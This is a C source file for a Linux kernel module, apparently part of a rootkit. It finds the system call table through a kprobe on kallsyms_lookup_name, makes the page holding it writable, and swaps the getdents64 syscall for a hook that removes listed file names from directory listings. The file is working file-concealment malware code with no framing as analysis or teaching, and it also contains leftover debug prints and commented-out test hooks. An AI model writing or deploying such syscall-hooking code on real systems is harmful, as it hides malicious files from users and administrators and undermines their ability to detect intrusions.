#include <linux/printk.h>

#include "hide_files.h"

// Original get_dents64 function pointer
typedef asmlinkage long (*getdents64_t)(unsigned int,
                                        struct linux_dirent64 __user *,
                                        unsigned int);
getdents64_t original_getdents64;
const char *hidden_files_names = ",headers.h,";
unsigned long **syscall_table;

typedef asmlinkage long (*getpid_t)(void);
getpid_t original_getpid;

static int been = 0;

static unsigned long **find_sys_call_table(void) {
  struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
  unsigned long (*kallsyms_lookup_name_sym)(const char *);
  unsigned long **sctable;

  register_kprobe(&kp);
  kallsyms_lookup_name_sym = (void *)kp.addr;
  unregister_kprobe(&kp);

  if (!kallsyms_lookup_name_sym) {
    printk(KERN_ERR "Failed to get kallsyms_lookup_name address\n");
    return NULL;
  }

  sctable = (unsigned long **)kallsyms_lookup_name_sym("sys_call_table");
  if (!sctable) {
    printk(KERN_ERR "Failed to find sys_call_table\n");
    return NULL;
  }

  printk(KERN_INFO "sys_call_table found at %px\n", sctable);
  return sctable;
}
static int set_page_write(unsigned long addr) {
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);

  if (!pte) {
    printk(KERN_ERR "Failed to lookup address %lx\n", addr);
    return 0;
  }

  if (!(pte->pte & _PAGE_PRESENT)) {
    printk(KERN_ERR "Page not present for address %lx\n", addr);
    return 0;
  }

  if (pte->pte & _PAGE_RW) {
    printk(KERN_INFO "Page already writable at %lx\n", addr);
    return 1;
  }

  printk(KERN_INFO "Setting page writable at %lx\n", addr);
  pte->pte |= _PAGE_RW;
  return 1;
}

static void set_page_no_write(unsigned long addr) {
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);

  pte->pte &= ~_PAGE_RW;
}

asmlinkage long sys_getdents64_hook(unsigned int fd,
                                    struct linux_dirent64 __user *dirent,
                                    unsigned int count) {
  long ret;
  struct linux_dirent64 *kdirent, *curr, *prev = NULL;
  unsigned long offset = 0;
  printk(KERN_INFO "getdents64 syscall hooked\n");

  char temp_name[256];
  ret = original_getdents64(fd, dirent, count);
  if (ret <= 0) // Ensure original get_dents64 copied data successfully
    return ret;

  kdirent = kvzalloc(ret, GFP_KERNEL);
  if (!kdirent) {
    return -ENOMEM;
  }

  // Copy all directory entries from user space (which were created by the
  // original syscall) To here so we can modify them and override them
  if (copy_from_user(kdirent, dirent, ret)) {
    kvfree(kdirent);
    return ret;
  }

  // Iterate untill we reach the end of the directory entries
  while (offset < ret) {
    curr = (void *)kdirent + offset;

    // Check if the current name is inside the hidden files list
    snprintf(temp_name, sizeof(temp_name), ",%s,", curr->d_name);
    printk(KERN_INFO "Checking file: %s\n", temp_name);
    if (strstr(hidden_files_names, temp_name) != NULL) {
      // If we find a match, we need to remove it from the list
      printk(KERN_INFO "Hiding file: %s\n", temp_name);
      if (curr == kdirent) { // If first entry
        ret -= curr->d_reclen;
        memmove(curr, (char *)curr + curr->d_reclen, ret);
      } else
        prev->d_reclen += curr->d_reclen; // Make the previous entry larger
    } else
      prev = curr;

    offset += curr->d_reclen; // Move to the next entry
  }

  if (copy_to_user(dirent, kdirent, ret))
    printk(KERN_ERR "Error copying data to user space\n");

  kvfree(kdirent);
  return ret;
}
/*asmlinkage long test_hook(unsigned int fd, struct linux_dirent64 __user
*dirent, unsigned int count) { printk(KERN_INFO "TEST HOOK CALLED!\n");
return original_getdents64(fd, dirent, count);
}

asmlinkage long getpid_hook(void) {
  printk(KERN_INFO "getpid syscall hooked\n");
  return original_getpid();
}*/

int hide_files_getdents64(void) {
  syscall_table = find_sys_call_table();
  if (!syscall_table)
    return -EFAULT;

  original_getdents64 = (getdents64_t)syscall_table[__NR_getdents64];

  printk(KERN_INFO "before %zx, %zx, %zx!!!\n", syscall_table,
         &syscall_table[__NR_getdents64],
         ((size_t)syscall_table) + 8 * __NR_getdents64);
  print_hex_dump_bytes("I AM GAY", DUMP_PREFIX_OFFSET, syscall_table, 32);
  printk(KERN_INFO "after!!!\n");
  set_page_write((unsigned long)&syscall_table[__NR_getdents64]);
  syscall_table[__NR_getdents64] = (unsigned long *)sys_getdents64_hook;
  set_page_no_write((unsigned long)&syscall_table[__NR_getdents64]);

  printk(KERN_INFO "Original: %px, New: %px, Func: %px\n", original_getdents64,
         syscall_table[__NR_getdents64], sys_getdents64_hook);
  printk(KERN_INFO "Hook installed.\n");
  return 0;
}

void restore_files_getdents64(void) {
  if (!syscall_table)
    return;

  printk(KERN_INFO "Original: %px, New: %px, Times: %d\n", original_getdents64,
         syscall_table[__NR_getdents64], been);
  set_page_write((unsigned long)&syscall_table[__NR_getdents64]);

  syscall_table[__NR_getdents64] = (unsigned long *)original_getdents64;

  set_page_no_write((unsigned long)&syscall_table[__NR_getdents64]);
  printk(KERN_INFO "Hook removed.\n");
}